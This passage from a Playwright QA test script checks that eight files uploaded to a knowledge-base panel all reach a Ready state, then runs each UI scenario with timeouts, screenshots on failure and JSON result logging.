  const files = Array.from({ length: 8 }, (_, i) => ({ name: `burst-${i}.txt`, mimeType: 'text/plain', buffer: Buffer.from(`burst note ${i} `.repeat(120)) })); await panel.getByLabel(/Drop files here/).setInputFiles(files);
  const t0 = Date.now(); let rows = 0, ready = 0, failed = 0; while (Date.now() - t0 < 120000) { await sleep(3000); rows = await panel.getByRole('listitem').count(); ready = await panel.getByText('Ready', { exact: true }).count(); failed = await panel.getByText(/Failed/).count(); if (ready + failed >= 8) break; }
  const txt = await panel.innerText(); const apiDocs = (await apiCall(user, 'GET', `/v1/knowledge/bases/${(await apiCall(user, 'GET', '/v1/knowledge/bases')).json.bases[0].kb_id}/documents`)).json.total; return ok(ready === 8 && apiDocs === 8, { rows, ready, failed, apiDocs, notice: (txt.match(/[^\n]*(wait|busy|too many|try again)[^\n]*/i) || [''])[0] });
});

(async () => {
  const browser = await chromium.launch(); fs.mkdirSync('/tmp/claude-0/qa/shots', { recursive: true });
  for (const s of SC) {
    if (ONLY && !ONLY.test(s.id)) continue; const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 }, acceptDownloads: true }); const page = await ctx.newPage();
    const errs = []; page.on('pageerror', e => errs.push('pageerror: ' + e.message)); page.on('console', m => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) errs.push('console: ' + m.text().slice(0, 160)); });
    page.on('dialog', d => { errs.push('dialog: ' + d.message()); d.dismiss(); });
    const user = `ui${s.id.replace(/\D/g, '')}${RUN}`; const t0 = Date.now(); let status = 'FAIL', actual = '', obs = '';
    try { const [a, ok_, o] = await Promise.race([s.fn({ page, user, browser }), new Promise((_, rej) => setTimeout(() => rej(new Error('scenario timeout 180s')), 180000))]); actual = typeof a === 'string' ? a : JSON.stringify(a); obs = o || ''; status = ok_ ? 'PASS' : 'FAIL'; } catch (e) { actual = 'exception: ' + String(e.message).split('\n')[0].slice(0, 300); status = 'FAIL'; }
    if (errs.length) obs += ' | browser: ' + errs.slice(0, 3).join(' ; '); if (errs.some(e => e.startsWith('dialog'))) status = 'FAIL';
    if (status === 'FAIL') await page.screenshot({ path: `/tmp/claude-0/qa/shots/${CYCLE}-${s.id}.png` }).catch(() => {});
    results.push({ id: s.id, area: s.area, kind: 'UI', description: s.description, preconditions: s.preconditions, steps: s.steps, expected: s.expected, actual: actual.slice(0, 900), status, observations: obs.slice(0, 900), seconds: +((Date.now() - t0) / 1000).toFixed(1), cycle: CYCLE });
    console.log(status, s.id, `${results[results.length-1].seconds}s`, actual.slice(0, 200)); fs.writeFileSync(`/tmp/claude-0/qa/results_ui_${CYCLE}.partial.json`, JSON.stringify(results, null, 1)); await ctx.close();
  }
  fs.writeFileSync(`/tmp/claude-0/qa/results_ui_${CYCLE}.json`, JSON.stringify(results, null, 1)); await browser.close();
  const c = {}; results.forEach(r => c[r.status] = (c[r.status] || 0) + 1); console.log(c);
})();
